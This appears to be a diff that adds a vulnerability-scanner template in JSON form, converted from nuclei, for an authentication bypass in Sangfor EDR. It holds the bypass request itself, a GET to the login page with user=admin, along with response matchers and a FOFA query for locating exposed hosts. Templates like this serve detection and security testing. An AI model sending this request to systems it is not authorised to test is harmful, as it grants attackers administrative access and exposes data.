@@ -1,0 +1,184 @@
+{
+  "id": "sangfor-edr-auth-bypass",
+  "name": "Sangfor EDR - Authentication Bypass",
+  "author": "princechaddha",
+  "severity": "HIGH",
+  "description": "Sangfor EDR contains an authentication bypass vulnerability. An attacker can access the system with admin privileges by accessing the login page directly using a provided username rather than going through the login screen without providing a username. This makes it possible to obtain sensitive information, modify data, and/or execute unauthorized operations.\n",
+  "tags": [
+    "sangfor",
+    "auth-bypass",
+    "login"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"sangfor\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-287",
+  "cvssScore": "8.1",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/ui/login.php?user\u003dadmin",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "/download/edr_installer_"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "Set-Cookie\u003d\"\""
+          ],
+          "negative": true,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "Set-Cookie\u003d"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "302"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "sangfor-edr-auth-bypass",
+    "info": {
+      "name": "Sangfor EDR - Authentication Bypass",
+      "author": "princechaddha",
+      "severity": "high",
+      "description": "Sangfor EDR contains an authentication bypass vulnerability. An attacker can access the system with admin privileges by accessing the login page directly using a provided username rather than going through the login screen without providing a username. This makes it possible to obtain sensitive information, modify data, and/or execute unauthorized operations.\n",
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "cvss_score": "8.1",
+        "cwe_id": "CWE-287"
+      },
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "app\u003d\"sangfor\""
+      },
+      "tags": "sangfor,auth-bypass,login"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/ui/login.php?user\u003dadmin"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "/download/edr_installer_"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": true,
+            "part": "header",
+            "words": [
+              "Set-Cookie\u003d\"\""
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header",
+            "words": [
+              "Set-Cookie\u003d"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              302
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
